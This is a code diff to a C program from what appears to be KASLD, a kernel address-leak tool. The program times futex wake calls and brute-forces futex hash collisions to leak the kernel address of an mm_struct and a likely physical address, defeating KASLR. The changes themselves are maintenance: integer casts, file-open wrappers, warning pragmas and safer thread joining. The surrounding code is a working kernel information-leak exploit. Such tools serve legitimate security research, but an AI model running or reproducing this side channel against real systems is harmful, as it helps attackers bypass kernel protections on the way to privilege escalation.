@@ -55,7 +55,6 @@
 
 #define _GNU_SOURCE
 #include "include/kasld/api.h"
-#include "include/kasld/internal.h"
 #include <errno.h>
 #include <limits.h>
 #include <linux/futex.h>
@@ -222,9 +221,9 @@ static inline uint32_t futex_bucket(unsigned long mm, unsigned long uaddr,
   unsigned long page_addr = uaddr & ~(PAGE_SIZE - 1);
   unsigned int offset = (unsigned int)(uaddr & (PAGE_SIZE - 1));
   k[0] = (uint32_t)(mm & 0xffffffff);
-  k[1] = (uint32_t)(mm >> 32);
+  k[1] = (uint32_t)((uint64_t)mm >> 32);
   k[2] = (uint32_t)(page_addr & 0xffffffff);
-  k[3] = (uint32_t)(page_addr >> 32);
+  k[3] = (uint32_t)((uint64_t)page_addr >> 32);
   return jhash2_4(k, offset) & (hashsize - 1);
 }
 
@@ -272,7 +271,7 @@ static int cmp_u64(const void *a, const void *b) {
 
 /* Read an unsigned long from a sysfs file. Returns 0 on failure. */
 static unsigned long read_sysfs_ulong(const char *path) {
-  FILE *f = fopen(path, "r");
+  FILE *f = kasld_fopen(path, "r");
   if (!f)
     return 0;
   unsigned long val = 0;
@@ -351,7 +350,13 @@ static void cleanup_pileup(void) {
     pthread_join(sleeper_tids[i], NULL);
 
   if (futex_region && futex_region != MAP_FAILED)
+  /* munmap takes void* — futex_region is volatile char* so the kernel can't
+   * be assumed to leave it alone between fork/clone events. Discarding the
+   * volatile qualifier at the unmap site is deliberate. */
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wcast-qual"
     munmap((void *)futex_region, FUTEX_REGION_SZ);
+#pragma GCC diagnostic pop
 }
 
 /* =========================================================================
@@ -367,8 +372,13 @@ static uint64_t measure_wake(unsigned long addr) {
   for (int i = 0; i < MEASUREMENTS; i++) {
     sched_yield();
     /* Structure-agnostic amplification: flush CPU caches so the
-     * kernel hash-table traversal incurs cache misses. */
+     * kernel hash-table traversal incurs cache misses. The cast drops
+     * volatile because memset needs a non-volatile buffer pointer; the
+     * write is the intended side effect (cache fill), not a single load. */
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wcast-qual"
     memset((char *)flush_buf, 1, sizeof(flush_buf));
+#pragma GCC diagnostic pop
 
     uint64_t t0 = rdtsc_begin();
     syscall(SYS_futex, (int *)addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
@@ -524,21 +534,21 @@ static void *search_fn(void *arg) {
   unsigned long p_page = ctx->pile_addr & ~(unsigned long)(PAGE_SIZE - 1);
   uint32_t p_off = (uint32_t)(ctx->pile_addr & (PAGE_SIZE - 1));
   uint32_t p_plo = (uint32_t)(p_page & 0xffffffffUL);
-  uint32_t p_phi = (uint32_t)(p_page >> 32);
+  uint32_t p_phi = (uint32_t)((uint64_t)p_page >> 32);
   uint32_t p_base = JHASH_INITVAL + 16u + p_off;
 
   /* Precompute loop-invariant hash inputs for collisions[0]. */
   unsigned long c0_page = ctx->collisions[0] & ~(unsigned long)(PAGE_SIZE - 1);
   uint32_t c0_off = (uint32_t)(ctx->collisions[0] & (PAGE_SIZE - 1));
   uint32_t c0_plo = (uint32_t)(c0_page & 0xffffffffUL);
-  uint32_t c0_phi = (uint32_t)(c0_page >> 32);
+  uint32_t c0_phi = (uint32_t)((uint64_t)c0_page >> 32);
   uint32_t c0_base = JHASH_INITVAL + 16u + c0_off;
 
   for (unsigned long mm = ta->mm_start; mm < ta->mm_end && !ctx->done;
        mm += mm_step) {
 
     uint32_t mm_lo = (uint32_t)(mm & 0xffffffffUL);
-    uint32_t mm_hi = (uint32_t)(mm >> 32);
+    uint32_t mm_hi = (uint32_t)((uint64_t)mm >> 32);
 
     /* Inline jhash2 for pile_addr — avoids function call + array build. */
     uint32_t a, b, c;
@@ -662,26 +672,44 @@ static unsigned long brute_force_mm(unsigned long *collisions,
             nthreads, step, total_iters,
             (double)(mm_end - mm_start) / (double)GB);
 
-  /* Start progress reporter. */
+  /* Start progress reporter. Joinable only when pthread_create succeeded;
+   * progress is cosmetic, so a creation failure just disables the bar. */
   pthread_t progress_tid;
-  pthread_create(&progress_tid, NULL, progress_fn, &ctx);
+  int progress_started =
+      (pthread_create(&progress_tid, NULL, progress_fn, &ctx) == 0);
 
+  /* Worker threads — track which ones actually started so we only join those.
+   * A failed pthread_create under resource pressure (FD/process limits) leaves
+   * tids[i] uninitialised; joining it would be UB. */
+  int *started = calloc((size_t)nthreads, sizeof(int));
+  if (!started) {
+    if (progress_started) {
+      ctx.done = 1;
+      pthread_join(progress_tid, NULL);
+    }
+    free(tids);
+    free(args);
+    return 0;
+  }
   for (int i = 0; i < nthreads; i++) {
     args[i].ctx = &ctx;
     args[i].mm_start = mm_start + (unsigned long)i * per_thread * step;
     args[i].mm_end = mm_start + ((unsigned long)i + 1) * per_thread * step;
     if (args[i].mm_end > mm_end)
       args[i].mm_end = mm_end;
-    pthread_create(&tids[i], NULL, search_fn, &args[i]);
+    started[i] = (pthread_create(&tids[i], NULL, search_fn, &args[i]) == 0);
   }
 
   for (int i = 0; i < nthreads; i++)
-    pthread_join(tids[i], NULL);
+    if (started[i])
+      pthread_join(tids[i], NULL);
 
   ctx.done = 1;
-  pthread_join(progress_tid, NULL);
+  if (progress_started)
+    pthread_join(progress_tid, NULL);
 
   unsigned long result = ctx.result;
+  free(started);
   free(tids);
   free(args);
   return result;
@@ -703,7 +731,7 @@ static unsigned long detect_mm_struct_size(void) {
 
   /* Try /proc/slabinfo (readable on some configs). Format:
    * name <active_objs> <num_objs> <objsize> ... */
-  FILE *f = fopen("/proc/slabinfo", "r");
+  FILE *f = kasld_fopen("/proc/slabinfo", "r");
   if (f) {
     char line[512];
     while (fgets(line, sizeof(line), f)) {
@@ -843,9 +871,9 @@ int main(void) {
   printf("leaked mm_struct address: %lx\n", result);
   kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, result, "mm_struct",
                       CONF_TIMING);
-#if !PHYS_VIRT_DECOUPLED
+#ifdef directmap_virt_to_phys
   {
-    unsigned long phys = virt_to_phys(result);
+    unsigned long phys = directmap_virt_to_phys(result);
     printf("  possible physical address: 0x%016lx\n", phys);
     kasld_result_sample(KASLD_TYPE_PHYS, REGION_DIRECTMAP, phys, "mm_struct",
                         CONF_TIMING);
